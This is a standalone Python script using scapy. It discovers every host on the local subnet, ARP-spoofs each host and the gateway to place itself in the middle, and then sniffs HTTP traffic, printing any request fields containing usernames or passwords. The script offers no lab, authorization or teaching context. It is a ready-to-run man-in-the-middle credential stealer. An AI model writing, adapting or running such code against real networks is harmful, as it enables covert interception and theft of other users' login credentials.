#!usr/bin/env python3

import scapy.all as scapy
import netifaces as ni
import time

from threading import Thread
ni.ifaddresses('ens33')
my_ip = ni.ifaddresses('ens33')[2][0]['addr']
my_mac = ni.ifaddresses('ens33')[ni.AF_LINK][0]['addr']

ap_ip = ni.gateways()['default'][ni.AF_INET][0]

target_ip = ap_ip + '/24'
# IP Address for the destination
# create ARP packet
arp = scapy.ARP(pdst=target_ip)
# create the Ether broadcast packet
# ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
# stack them
packet = ether/arp

result = scapy.srp(packet, timeout=3, verbose=0)[0]

# a list of clients, we will fill this in the upcoming loop
clients = []
for sent, received in result:
    if received.psrc == ap_ip :
        ap_mac = received.hwsrc
    else:
        # for each response, append ip and mac address to `clients` list
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})


# print clients
print("Available devices in the network:")
print("IP" + " "*18+"MAC")
for client in clients:
    print("{:16}    {}".format(client['ip'], client['mac']))


def spoof_all(c_ip, c_mac):
    packet = scapy.ARP(op=2, pdst=c_ip, hwdst=c_mac, psrc=ap_ip)
    packet2 = scapy.ARP(op=2, pdst=ap_ip, hwdst=ap_mac, psrc=c_ip)
    scapy.send(packet, verbose=False)
    scapy.send(packet2, verbose=False)

import scapy.all as scapy
from scapy.layers import http

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname",
                   "user", "login","User","Password",
                    "password", "pass"]
        for keyword in keywords:
            encode_word=str.encode(keyword)
            if encode_word in load:
                 return load


   
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        login_info = get_login_info(packet)
        if login_info:
            res = bytes.decode(login_info)
            milkshop = res.split('&')
            print(milkshop[0])
            print(milkshop[1])
            print()
            print("If you want to EXIT, please press 'Ctrl+C'.")
            
def sniff(interface):
    scapy.sniff(iface=interface, store=False,
            prn=process_sniffed_packet)

try:
    while(1):
        for c in clients:

            spoof_all(c['ip'], c['mac'])

        sniff('ens33')
        time.sleep(1.5)
except KeyboardInterrupt:    
    print("good bye:))")
